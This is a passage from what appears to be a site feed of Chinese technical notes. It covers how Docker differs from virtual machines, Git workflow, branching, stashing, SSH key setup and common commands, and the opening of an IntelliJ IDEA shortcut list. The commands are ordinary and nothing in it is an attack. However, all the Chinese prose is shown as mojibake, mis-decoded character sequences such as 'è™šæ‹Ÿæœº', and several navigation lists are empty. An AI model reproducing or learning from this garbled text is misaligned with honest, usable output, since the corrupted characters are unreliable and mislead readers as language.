<p>è™šæ‹Ÿæœºä¹Ÿæ˜¯ä¸€ç§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå®ƒä¸ Docker æœ€å¤§çš„åŒºåˆ«åœ¨äºå®ƒæ˜¯é€šè¿‡æ¨¡æ‹Ÿç¡¬ä»¶ï¼Œå¹¶åœ¨ç¡¬ä»¶ä¸Šå®‰è£…æ“ä½œç³»ç»Ÿæ¥å®ç°ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/be608a77-7b7f-4f8e-87cc-f2237270bf69.png" width="500"/> </div><br>
<h2 id="å¯åŠ¨é€Ÿåº¦" tabindex="-1"> å¯åŠ¨é€Ÿåº¦</h2>
<p>å¯åŠ¨è™šæ‹Ÿæœºéœ€è¦å…ˆå¯åŠ¨è™šæ‹Ÿæœºçš„æ“ä½œç³»ç»Ÿï¼Œå†å¯åŠ¨åº”ç”¨ï¼Œè¿™ä¸ªè¿‡ç¨‹éå¸¸æ…¢ï¼›</p>
<p>è€Œå¯åŠ¨ Docker ç›¸å½“äºå¯åŠ¨å®¿ä¸»æ“ä½œç³»ç»Ÿä¸Šçš„ä¸€ä¸ªè¿›ç¨‹ã€‚</p>
<h2 id="å ç”¨èµ„æº" tabindex="-1"> å ç”¨èµ„æº</h2>
<p>è™šæ‹Ÿæœºæ˜¯ä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼Œéœ€è¦å ç”¨å¤§é‡çš„ç£ç›˜ã€å†…å­˜å’Œ CPU èµ„æºï¼Œä¸€å°æœºå™¨åªèƒ½å¼€å¯å‡ åä¸ªçš„è™šæ‹Ÿæœºã€‚</p>
<p>è€Œ Docker åªæ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼Œåªéœ€è¦å°†åº”ç”¨ä»¥åŠç›¸å…³çš„ç»„ä»¶æ‰“åŒ…ï¼Œåœ¨è¿è¡Œæ—¶å ç”¨å¾ˆå°‘çš„èµ„æºï¼Œä¸€å°æœºå™¨å¯ä»¥å¼€å¯æˆåƒä¸Šä¸‡ä¸ª Dockerã€‚</p>
<h1 id="ä¸‰ã€ä¼˜åŠ¿" tabindex="-1"> ä¸‰ã€ä¼˜åŠ¿</h1>
<p>é™¤äº†å¯åŠ¨é€Ÿåº¦å¿«ä»¥åŠå ç”¨èµ„æºå°‘ä¹‹å¤–ï¼ŒDocker å…·æœ‰ä»¥ä¸‹ä¼˜åŠ¿ï¼š</p>
<h2 id="æ›´å®¹æ˜“è¿ç§»" tabindex="-1"> æ›´å®¹æ˜“è¿ç§»</h2>
<p>æä¾›ä¸€è‡´æ€§çš„è¿è¡Œç¯å¢ƒã€‚å·²ç»æ‰“åŒ…å¥½çš„åº”ç”¨å¯ä»¥åœ¨ä¸åŒçš„æœºå™¨ä¸Šè¿›è¡Œè¿ç§»ï¼Œè€Œä¸ç”¨æ‹…å¿ƒç¯å¢ƒå˜åŒ–å¯¼è‡´æ— æ³•è¿è¡Œã€‚</p>
<h2 id="æ›´å®¹æ˜“ç»´æŠ¤" tabindex="-1"> æ›´å®¹æ˜“ç»´æŠ¤</h2>
<p>ä½¿ç”¨åˆ†å±‚æŠ€æœ¯å’Œé•œåƒï¼Œä½¿å¾—åº”ç”¨å¯ä»¥æ›´å®¹æ˜“å¤ç”¨é‡å¤çš„éƒ¨åˆ†ã€‚å¤ç”¨ç¨‹åº¦è¶Šé«˜ï¼Œç»´æŠ¤å·¥ä½œä¹Ÿè¶Šå®¹æ˜“ã€‚</p>
<h2 id="æ›´å®¹æ˜“æ‰©å±•" tabindex="-1"> æ›´å®¹æ˜“æ‰©å±•</h2>
<p>å¯ä»¥ä½¿ç”¨åŸºç¡€é•œåƒè¿›ä¸€æ­¥æ‰©å±•å¾—åˆ°æ–°çš„é•œåƒï¼Œå¹¶ä¸”å®˜æ–¹å’Œå¼€æºç¤¾åŒºæä¾›äº†å¤§é‡çš„é•œåƒï¼Œé€šè¿‡æ‰©å±•è¿™äº›é•œåƒå¯ä»¥éå¸¸å®¹æ˜“å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„é•œåƒã€‚</p>
<h1 id="å››ã€ä½¿ç”¨åœºæ™¯" tabindex="-1"> å››ã€ä½¿ç”¨åœºæ™¯</h1>
<h2 id="æŒç»­é›†æˆ" tabindex="-1"> æŒç»­é›†æˆ</h2>
<p>æŒç»­é›†æˆæŒ‡çš„æ˜¯é¢‘ç¹åœ°å°†ä»£ç é›†æˆåˆ°ä¸»å¹²ä¸Šï¼Œè¿™æ ·èƒ½å¤Ÿæ›´å¿«åœ°å‘ç°é”™è¯¯ã€‚</p>
<p>Docker å…·æœ‰è½»é‡çº§ä»¥åŠéš”ç¦»æ€§çš„ç‰¹ç‚¹ï¼Œåœ¨å°†ä»£ç é›†æˆåˆ°ä¸€ä¸ª Docker ä¸­ä¸ä¼šå¯¹å…¶å®ƒ Docker äº§ç”Ÿå½±å“ã€‚</p>
<h2 id="æä¾›å¯ä¼¸ç¼©çš„äº‘æœåŠ¡" tabindex="-1"> æä¾›å¯ä¼¸ç¼©çš„äº‘æœåŠ¡</h2>
<p>æ ¹æ®åº”ç”¨çš„è´Ÿè½½æƒ…å†µï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°å¢åŠ æˆ–è€…å‡å°‘ Dockerã€‚</p>
<h2 id="æ­å»ºå¾®æœåŠ¡æ¶æ„" tabindex="-1"> æ­å»ºå¾®æœåŠ¡æ¶æ„</h2>
<p>Docker è½»é‡çº§çš„ç‰¹ç‚¹ä½¿å¾—å®ƒå¾ˆé€‚åˆç”¨äºéƒ¨ç½²ã€ç»´æŠ¤ã€ç»„åˆå¾®æœåŠ¡ã€‚</p>
<h1 id="äº”ã€é•œåƒä¸å®¹å™¨" tabindex="-1"> äº”ã€é•œåƒä¸å®¹å™¨</h1>
<p>é•œåƒæ˜¯ä¸€ç§é™æ€çš„ç»“æ„ï¼Œå¯ä»¥çœ‹æˆé¢å‘å¯¹è±¡é‡Œé¢çš„ç±»ï¼Œè€Œå®¹å™¨æ˜¯é•œåƒçš„ä¸€ä¸ªå®ä¾‹ã€‚</p>
<p>é•œåƒåŒ…å«ç€å®¹å™¨è¿è¡Œæ—¶æ‰€éœ€è¦çš„ä»£ç ä»¥åŠå…¶å®ƒç»„ä»¶ï¼Œå®ƒæ˜¯ä¸€ç§åˆ†å±‚ç»“æ„ï¼Œæ¯ä¸€å±‚éƒ½æ˜¯åªè¯»çš„ï¼ˆread-only layersï¼‰ã€‚æ„å»ºé•œåƒæ—¶ï¼Œä¼šä¸€å±‚ä¸€å±‚æ„å»ºï¼Œå‰ä¸€å±‚æ˜¯åä¸€å±‚çš„åŸºç¡€ã€‚é•œåƒçš„è¿™ç§åˆ†å±‚å­˜å‚¨ç»“æ„å¾ˆé€‚åˆé•œåƒçš„å¤ç”¨ä»¥åŠå®šåˆ¶ã€‚</p>
<p>æ„å»ºå®¹å™¨æ—¶ï¼Œé€šè¿‡åœ¨é•œåƒçš„åŸºç¡€ä¸Šæ·»åŠ ä¸€ä¸ªå¯å†™å±‚ï¼ˆwritable layerï¼‰ï¼Œç”¨æ¥ä¿å­˜ç€å®¹å™¨è¿è¡Œè¿‡ç¨‹ä¸­çš„ä¿®æ”¹ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/docker-filesystems-busyboxrw.png"/> </div><br>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li><a href="https://blog.docker.com/2017/08/docker-101-introduction-docker-webinar-recap/" target="_blank" rel="noopener noreferrer">DOCKER 101: INTRODUCTION TO DOCKER WEBINAR RECAP</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener noreferrer">Docker å…¥é—¨æ•™ç¨‹</a></li>
<li><a href="http://www.bogotobogo.com/DevOps/Docker/Docker_Container_vs_Virtual_Machine.php" target="_blank" rel="noopener noreferrer">Docker container vs Virtual machine</a></li>
<li><a href="https://linoxide.com/linux-how-to/dockerfile-create-docker-container/" target="_blank" rel="noopener noreferrer">How to Create Docker Container using Dockerfile</a></li>
<li><a href="http://www.cnblogs.com/sammyliu/p/5877964.html" target="_blank" rel="noopener noreferrer">ç†è§£ Dockerï¼ˆ2ï¼‰ï¼šDocker é•œåƒ</a></li>
<li><a href="https://yeasy.gitbooks.io/docker_practice/introduction/why.html" target="_blank" rel="noopener noreferrer">ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ Dockerï¼Ÿ</a></li>
<li><a href="https://www.docker.com/what-docker" target="_blank" rel="noopener noreferrer">What is Docker</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2015/09/continuous-integration.html" target="_blank" rel="noopener noreferrer">æŒç»­é›†æˆæ˜¯ä»€ä¹ˆï¼Ÿ</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">é›†ä¸­å¼ä¸åˆ†å¸ƒå¼</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/Git.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/Git.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="é›†ä¸­å¼ä¸åˆ†å¸ƒå¼" tabindex="-1"> é›†ä¸­å¼ä¸åˆ†å¸ƒå¼</h1>
<p>Git å±äºåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œè€Œ SVN å±äºé›†ä¸­å¼ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1fe2dc77-9a2d-4643-90b3-bbf50f649bac.png" width="600px"> </div><br>
<p>é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶åªæœ‰ä¸­å¿ƒæœåŠ¡å™¨æ‹¥æœ‰ä¸€ä»½ä»£ç ï¼Œè€Œåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶æ¯ä¸ªäººçš„ç”µè„‘ä¸Šå°±æœ‰ä¸€ä»½å®Œæ•´çš„ä»£ç ã€‚</p>
<p>é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶æœ‰å®‰å…¨æ€§é—®é¢˜ï¼Œå½“ä¸­å¿ƒæœåŠ¡å™¨æŒ‚äº†æ‰€æœ‰äººéƒ½æ²¡åŠæ³•å·¥ä½œäº†ã€‚</p>
<p>é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶éœ€è¦è¿ç½‘æ‰èƒ½å·¥ä½œï¼Œå¦‚æœç½‘é€Ÿè¿‡æ…¢ï¼Œé‚£ä¹ˆæäº¤ä¸€ä¸ªæ–‡ä»¶ä¼šæ…¢çš„æ— æ³•è®©äººå¿å—ã€‚è€Œåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ä¸éœ€è¦è¿ç½‘å°±èƒ½å·¥ä½œã€‚</p>
<p>åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶æ–°å»ºåˆ†æ”¯ã€åˆå¹¶åˆ†æ”¯æ“ä½œé€Ÿåº¦éå¸¸å¿«ï¼Œè€Œé›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶æ–°å»ºä¸€ä¸ªåˆ†æ”¯ç›¸å½“äºå¤åˆ¶ä¸€ä»½å®Œæ•´ä»£ç ã€‚</p>
<h1 id="ä¸­å¿ƒæœåŠ¡å™¨" tabindex="-1"> ä¸­å¿ƒæœåŠ¡å™¨</h1>
<p>ä¸­å¿ƒæœåŠ¡å™¨ç”¨æ¥äº¤æ¢æ¯ä¸ªç”¨æˆ·çš„ä¿®æ”¹ï¼Œæ²¡æœ‰ä¸­å¿ƒæœåŠ¡å™¨ä¹Ÿèƒ½å·¥ä½œï¼Œä½†æ˜¯ä¸­å¿ƒæœåŠ¡å™¨èƒ½å¤Ÿ 24 å°æ—¶ä¿æŒå¼€æœºçŠ¶æ€ï¼Œè¿™æ ·å°±èƒ½æ›´æ–¹ä¾¿çš„äº¤æ¢ä¿®æ”¹ã€‚</p>
<p>Github å°±æ˜¯ä¸€ä¸ªä¸­å¿ƒæœåŠ¡å™¨ã€‚</p>
<h1 id="å·¥ä½œæµ" tabindex="-1"> å·¥ä½œæµ</h1>
<p>æ–°å»ºä¸€ä¸ªä»“åº“ä¹‹åï¼Œå½“å‰ç›®å½•å°±æˆä¸ºäº†å·¥ä½œåŒºï¼Œå·¥ä½œåŒºä¸‹æœ‰ä¸€ä¸ªéšè—ç›®å½• .gitï¼Œå®ƒå±äº Git çš„ç‰ˆæœ¬åº“ã€‚</p>
<p>Git çš„ç‰ˆæœ¬åº“æœ‰ä¸€ä¸ªç§°ä¸º Stage çš„æš‚å­˜åŒºä»¥åŠæœ€åçš„ History ç‰ˆæœ¬åº“ï¼ŒHistory å­˜å‚¨æ‰€æœ‰åˆ†æ”¯ä¿¡æ¯ï¼Œä½¿ç”¨ä¸€ä¸ª HEAD æŒ‡é’ˆæŒ‡å‘å½“å‰åˆ†æ”¯ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/71b97a50-a49f-4f1a-81d1-48c3364d61b3.png" width="700px"> </div><br>
<ul>
<li>git add files æŠŠæ–‡ä»¶çš„ä¿®æ”¹æ·»åŠ åˆ°æš‚å­˜åŒº</li>
<li>git commit æŠŠæš‚å­˜åŒºçš„ä¿®æ”¹æäº¤åˆ°å½“å‰åˆ†æ”¯ï¼Œæäº¤ä¹‹åæš‚å­˜åŒºå°±è¢«æ¸…ç©ºäº†</li>
<li>git reset -- files ä½¿ç”¨å½“å‰åˆ†æ”¯ä¸Šçš„ä¿®æ”¹è¦†ç›–æš‚å­˜åŒºï¼Œç”¨æ¥æ’¤é”€æœ€åä¸€æ¬¡ git add files</li>
<li>git checkout -- files ä½¿ç”¨æš‚å­˜åŒºçš„ä¿®æ”¹è¦†ç›–å·¥ä½œç›®å½•ï¼Œç”¨æ¥æ’¤é”€æœ¬åœ°ä¿®æ”¹</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/72ee7e9a-194d-42e9-b4d7-29c23417ca18.png" width="320px"> </div><br>
<p>å¯ä»¥è·³è¿‡æš‚å­˜åŒºåŸŸç›´æ¥ä»åˆ†æ”¯ä¸­å–å‡ºä¿®æ”¹ï¼Œæˆ–è€…ç›´æ¥æäº¤ä¿®æ”¹åˆ°åˆ†æ”¯ä¸­ã€‚</p>
<ul>
<li>git commit -a ç›´æ¥æŠŠæ‰€æœ‰æ–‡ä»¶çš„ä¿®æ”¹æ·»åŠ åˆ°æš‚å­˜åŒºç„¶åæ‰§è¡Œæäº¤</li>
<li>git checkout HEAD -- files å–å‡ºæœ€åä¸€æ¬¡ä¿®æ”¹ï¼Œå¯ä»¥ç”¨æ¥è¿›è¡Œå›æ»šæ“ä½œ</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a4a0a6e6-386b-4bfa-b899-ec33d3310f3e.png" width="500px"> </div><br>
<h1 id="åˆ†æ”¯å®ç°" tabindex="-1"> åˆ†æ”¯å®ç°</h1>
<p>ä½¿ç”¨æŒ‡é’ˆå°†æ¯ä¸ªæäº¤è¿æ¥æˆä¸€æ¡æ—¶é—´çº¿ï¼ŒHEAD æŒ‡é’ˆæŒ‡å‘å½“å‰åˆ†æ”¯æŒ‡é’ˆã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ec4d7464-7140-46d8-827e-d63634202e1e.png" width="220px"> </div><br>
<p>æ–°å»ºåˆ†æ”¯æ˜¯æ–°å»ºä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘æ—¶é—´çº¿çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¹¶è®© HEAD æŒ‡é’ˆæŒ‡å‘æ–°åˆ†æ”¯ï¼Œè¡¨ç¤ºæ–°åˆ†æ”¯æˆä¸ºå½“å‰åˆ†æ”¯ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66d00642-ce37-466c-8f7a-143d0bf84cd6.png" width="220px"> </div><br>
<p>æ¯æ¬¡æäº¤åªä¼šè®©å½“å‰åˆ†æ”¯æŒ‡é’ˆå‘å‰ç§»åŠ¨ï¼Œè€Œå…¶å®ƒåˆ†æ”¯æŒ‡é’ˆä¸ä¼šç§»åŠ¨ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/72a01242-e6b4-46c5-a285-24e754d63093.png" width="300px"> </div><br>
<p>åˆå¹¶åˆ†æ”¯ä¹Ÿåªéœ€è¦æ”¹å˜æŒ‡é’ˆå³å¯ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/94617147-0cbd-4a28-847d-81e52efb1b1e.png" width="300px"> </div><br>
<h1 id="å†²çª" tabindex="-1"> å†²çª</h1>
<p>å½“ä¸¤ä¸ªåˆ†æ”¯éƒ½å¯¹åŒä¸€ä¸ªæ–‡ä»¶çš„åŒä¸€è¡Œè¿›è¡Œäº†ä¿®æ”¹ï¼Œåœ¨åˆ†æ”¯åˆå¹¶æ—¶å°±ä¼šäº§ç”Ÿå†²çªã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/32b05e81-41b3-414a-8656-736c9604e3d6.png" width="300px"> </div><br>
<p>Git ä¼šä½¿ç”¨ &lt;&lt;&lt;&lt;&lt;&lt;&lt; ï¼Œ======= ï¼Œ&gt;&gt;&gt;&gt;&gt;&gt;&gt; æ ‡è®°å‡ºä¸åŒåˆ†æ”¯çš„å†…å®¹ï¼Œåªéœ€è¦æŠŠä¸åŒåˆ†æ”¯ä¸­å†²çªéƒ¨åˆ†ä¿®æ”¹æˆä¸€æ ·å°±èƒ½è§£å†³å†²çªã€‚</p>
<div><pre><code>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
Creating a new branch is quick &amp; simple.
=======
Creating a new branch is quick AND simple.
>>>>>>> feature1
</code></pre></div><h1 id="fast-forward" tabindex="-1"> Fast forward</h1>
<p>&quot;å¿«è¿›å¼åˆå¹¶&quot;ï¼ˆfast-farward mergeï¼‰ï¼Œä¼šç›´æ¥å°† master åˆ†æ”¯æŒ‡å‘åˆå¹¶çš„åˆ†æ”¯ï¼Œè¿™ç§æ¨¡å¼ä¸‹è¿›è¡Œåˆ†æ”¯åˆå¹¶ä¼šä¸¢å¤±åˆ†æ”¯ä¿¡æ¯ï¼Œä¹Ÿå°±ä¸èƒ½åœ¨åˆ†æ”¯å†å²ä¸Šçœ‹å‡ºåˆ†æ”¯ä¿¡æ¯ã€‚</p>
<p>å¯ä»¥åœ¨åˆå¹¶æ—¶åŠ ä¸Š --no-ff å‚æ•°æ¥ç¦ç”¨ Fast forward æ¨¡å¼ï¼Œå¹¶ä¸”åŠ ä¸Š -m å‚æ•°è®©åˆå¹¶æ—¶äº§ç”Ÿä¸€ä¸ªæ–°çš„ commitã€‚</p>
<div><pre><code>$ git merge --no-ff -m "merge with no-ff" dev
</code></pre></div><div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9a519773-84b2-4c81-81cf-4e7dd739a97a.png" width="350px"> </div><br>
<h1 id="åˆ†æ”¯ç®¡ç†ç­–ç•¥" tabindex="-1"> åˆ†æ”¯ç®¡ç†ç­–ç•¥</h1>
<p>master åˆ†æ”¯åº”è¯¥æ˜¯éå¸¸ç¨³å®šçš„ï¼Œåªç”¨æ¥å‘å¸ƒæ–°ç‰ˆæœ¬ï¼›</p>
<p>æ—¥å¸¸å¼€å‘åœ¨å¼€å‘åˆ†æ”¯ dev ä¸Šè¿›è¡Œã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/245fd2fb-209c-4ad5-bc5e-eb5664966a0e.jpg" width=""> </div><br>
<h1 id="å‚¨è—-stashing" tabindex="-1"> å‚¨è—ï¼ˆStashingï¼‰</h1>
<p>åœ¨ä¸€ä¸ªåˆ†æ”¯ä¸Šæ“ä½œä¹‹åï¼Œå¦‚æœè¿˜æ²¡æœ‰å°†ä¿®æ”¹æäº¤åˆ°åˆ†æ”¯ä¸Šï¼Œæ­¤æ—¶è¿›è¡Œåˆ‡æ¢åˆ†æ”¯ï¼Œé‚£ä¹ˆå¦ä¸€ä¸ªåˆ†æ”¯ä¸Šä¹Ÿèƒ½çœ‹åˆ°æ–°çš„ä¿®æ”¹ã€‚è¿™æ˜¯å› ä¸ºæ‰€æœ‰åˆ†æ”¯éƒ½å…±ç”¨ä¸€ä¸ªå·¥ä½œåŒºçš„ç¼˜æ•…ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨ git stash å°†å½“å‰åˆ†æ”¯çš„ä¿®æ”¹å‚¨è—èµ·æ¥ï¼Œæ­¤æ—¶å½“å‰å·¥ä½œåŒºçš„æ‰€æœ‰ä¿®æ”¹éƒ½ä¼šè¢«å­˜åˆ°æ ˆä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´å½“å‰å·¥ä½œåŒºæ˜¯å¹²å‡€çš„ï¼Œæ²¡æœ‰ä»»ä½•æœªæäº¤çš„ä¿®æ”¹ã€‚æ­¤æ—¶å°±å¯ä»¥å®‰å…¨çš„åˆ‡æ¢åˆ°å…¶å®ƒåˆ†æ”¯ä¸Šäº†ã€‚</p>
<div><pre><code>$ git stash
Saved working directory and index state \ "WIP on master: 049d078 added the index file"
HEAD is now at 049d078 added the index file (To restore them type "git stash apply")
</code></pre></div><p>è¯¥åŠŸèƒ½å¯ä»¥ç”¨äº bug åˆ†æ”¯çš„å®ç°ã€‚å¦‚æœå½“å‰æ­£åœ¨ dev åˆ†æ”¯ä¸Šè¿›è¡Œå¼€å‘ï¼Œä½†æ˜¯æ­¤æ—¶ master ä¸Šæœ‰ä¸ª bug éœ€è¦ä¿®å¤ï¼Œä½†æ˜¯ dev åˆ†æ”¯ä¸Šçš„å¼€å‘è¿˜æœªå®Œæˆï¼Œä¸æƒ³ç«‹å³æäº¤ã€‚åœ¨æ–°å»º bug åˆ†æ”¯å¹¶åˆ‡æ¢åˆ° bug åˆ†æ”¯ä¹‹å‰å°±éœ€è¦ä½¿ç”¨ git stash å°† dev åˆ†æ”¯çš„æœªæäº¤ä¿®æ”¹å‚¨è—èµ·æ¥ã€‚</p>
<h1 id="ssh-ä¼ è¾“è®¾ç½®" tabindex="-1"> SSH ä¼ è¾“è®¾ç½®</h1>
<p>Git ä»“åº“å’Œ Github ä¸­å¿ƒä»“åº“ä¹‹é—´çš„ä¼ è¾“æ˜¯é€šè¿‡ SSH åŠ å¯†ã€‚</p>
<p>å¦‚æœå·¥ä½œåŒºä¸‹æ²¡æœ‰ .ssh ç›®å½•ï¼Œæˆ–è€…è¯¥ç›®å½•ä¸‹æ²¡æœ‰ id_rsa å’Œ id_rsa.pub è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»º SSH Keyï¼š</p>
<div><pre><code>$ ssh-keygen -t rsa -C "youremail@example.com"
</code></pre></div><p>ç„¶åæŠŠå…¬é’¥ id_rsa.pub çš„å†…å®¹å¤åˆ¶åˆ° Github &quot;Account settings&quot; çš„ SSH Keys ä¸­ã€‚</p>
<h1 id="gitignore-æ–‡ä»¶" tabindex="-1"> .gitignore æ–‡ä»¶</h1>
<p>å¿½ç•¥ä»¥ä¸‹æ–‡ä»¶ï¼š</p>
<ul>
<li>æ“ä½œç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆçš„æ–‡ä»¶ï¼Œæ¯”å¦‚ç¼©ç•¥å›¾ï¼›</li>
<li>ç¼–è¯‘ç”Ÿæˆçš„ä¸­é—´æ–‡ä»¶ï¼Œæ¯”å¦‚ Java ç¼–è¯‘äº§ç”Ÿçš„ .class æ–‡ä»¶ï¼›</li>
<li>è‡ªå·±çš„æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚å­˜æ”¾å£ä»¤çš„é…ç½®æ–‡ä»¶ã€‚</li>
</ul>
<p>ä¸éœ€è¦å…¨éƒ¨è‡ªå·±ç¼–å†™ï¼Œå¯ä»¥åˆ° <a href="https://github.com/github/gitignore" target="_blank" rel="noopener noreferrer">https://github.com/github/gitignore</a> ä¸­è¿›è¡ŒæŸ¥è¯¢ã€‚</p>
<h1 id="git-å‘½ä»¤ä¸€è§ˆ" tabindex="-1"> Git å‘½ä»¤ä¸€è§ˆ</h1>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7a29acce-f243-4914-9f00-f2988c528412.jpg" width=""> </div><br>
<p>æ¯”è¾ƒè¯¦ç»†çš„åœ°å€ï¼šhttp://www.cheat-sheets.org/saved-copy/git-cheat-sheet.pdf</p>
<h2 id="gitå¸¸ç”¨å‘½ä»¤" tabindex="-1"> gitå¸¸ç”¨å‘½ä»¤</h2>
<ul>
<li>å…‹éš†é¡¹ç›®ï¼šgit clone xxx.git</li>
<li>åˆ›å»ºåˆ†æ”¯ï¼šgit branch daily/1.0.0</li>
<li>åˆ‡æ¢åˆ†æ”¯ï¼šgit checkout daily/1.0.0</li>
<li>æŸ¥çœ‹æœ¬åœ°åˆ†æ”¯ï¼šgit branch</li>
<li>æŸ¥å‡ºè¿œç¨‹åˆ†æ”¯ï¼šgit branch -r</li>
<li>æŸ¥çœ‹æœ¬åœ°è¿œç¨‹åˆ†æ”¯:git branch -a</li>
<li>åˆ›å»ºå¹¶åˆ‡æ¢åˆ†æ”¯ï¼šgit checkout -b daily/1.0.0</li>
<li>åˆ é™¤æœ¬åœ°åˆ†æ”¯ï¼šgit branch -d daily/1.0.0</li>
<li>å¼ºåˆ¶åˆ é™¤æœ¬åœ°åˆ†æ”¯ï¼šgit branch -D daily/1.0.0</li>
<li>æŸ¥çœ‹åˆ†æ”¯çŠ¶æ€ï¼šgit status</li>
<li>æ·»åŠ æ–‡ä»¶åˆ°git: git add file1 file2</li>
<li>æ·»åŠ æ‰€æœ‰æ–‡ä»¶: git add .</li>
<li>æäº¤æ–‡ä»¶: git commit -m'æ³¨é‡Š'</li>
<li>æ‹‰ä¸»å¹²ï¼šgit pull origin master</li>
<li>åˆå¹¶ä¸»å¹²ï¼šgit merge master</li>
<li>æ›´æ–°åˆ†æ”¯ï¼šgit pull -u origin daily/1.0.0</li>
<li>æ¨é€ä»£ç åˆ°è¿œç«¯ï¼šgit push -u origin daily/1.0.0</li>
<li>æ‰“tag: git tag publish/1.0.0</li>
<li>å‘å¸ƒåˆ°ä¸»å¹²ï¼šgit push -u origin publish/1.0.0</li>
</ul>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li><a href="http://rogerdudler.github.io/git-guide/index.zh.html" target="_blank" rel="noopener noreferrer">Git - ç®€æ˜æŒ‡å—</a></li>
<li><a href="http://marklodato.github.io/visual-git-guide/index-zh-cn.html" target="_blank" rel="noopener noreferrer">å›¾è§£ Git</a></li>
<li><a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" target="_blank" rel="noopener noreferrer">å»–é›ªå³° : Git æ•™ç¨‹</a></li>
<li><a href="https://learngitbranching.js.org/" target="_blank" rel="noopener noreferrer">Learn Git Branching</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">å¼€å‘æ•ˆç‡</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/IDEA.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%B7%A5%E5%85%B7/IDEA.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>

<h1 id="å¼€å‘æ•ˆç‡" tabindex="-1"> å¼€å‘æ•ˆç‡</h1>
<h2 id="å¸¸ç”¨å¿«æ·é”®" tabindex="-1"> å¸¸ç”¨å¿«æ·é”®</h2>
<ul>
<li>Shift+Shift     æœç´¢æ‰€æœ‰æ–‡ä»¶</li>
</ul>
<p>ç¼–è¾‘æ“ä½œ</p>
<ul>
<li>Ctrl+Alt+Enter     åœ¨å½“å‰è¡Œå‰æ’å…¥ä¸€è¡Œ</li>
<li>Shift+Enter     åœ¨å½“å‰è¡Œä¸‹é¢å¢åŠ ä¸€è¡Œ</li>
<li>Ctrl+Y     åˆ é™¤å½“å‰è¡Œ</li>
<li>Ctrl+Z     æ’¤é”€</li>
<li>Ctrl+Shift+Z     åæ’¤é”€</li>
<li>Ctrl+Alt+L     æ ¼å¼åŒ–ä»£ç </li>
